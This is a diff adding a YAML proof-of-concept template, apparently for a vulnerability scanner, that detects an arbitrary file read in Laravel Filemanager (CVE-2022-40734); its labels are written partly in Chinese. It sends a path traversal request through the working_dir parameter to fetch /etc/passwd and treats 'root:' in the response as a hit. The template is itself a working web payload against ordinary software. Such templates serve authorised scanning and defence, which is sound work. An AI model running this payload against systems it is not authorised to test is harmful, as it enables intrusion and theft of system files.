@@ -1,0 +1,27 @@
+id: poc-yaml-laravel-filemanager-anyfile-read
+info:
+  name: Laravel Filemanager 任意文件读取漏洞(CVE-2022-40734)
+  severity: medium
+  tags:
+  - CVE-2022-40734
+  - 任意文件或目录访问
+  finger: laravel_filemanager
+variables:
+  path: '"laravel-filemanager/download?working_dir=%2F../../../../../../../../../../../../../../../../../../../etc&type=Files&file=passwd"
+
+    "download?working_dir=%2F../../../../../../../../../../../../../../../../../../../etc&type=Files&file=passwd"
+
+    '
+requests:
+- method: GET
+  path: /{{.path}}
+  expression: 'status_code == 200 &&
+
+    contains(body,"root:") &&
+
+    contains(body,"/bin") &&
+
+    !contains(body,"<")
+
+    '
+transport: http
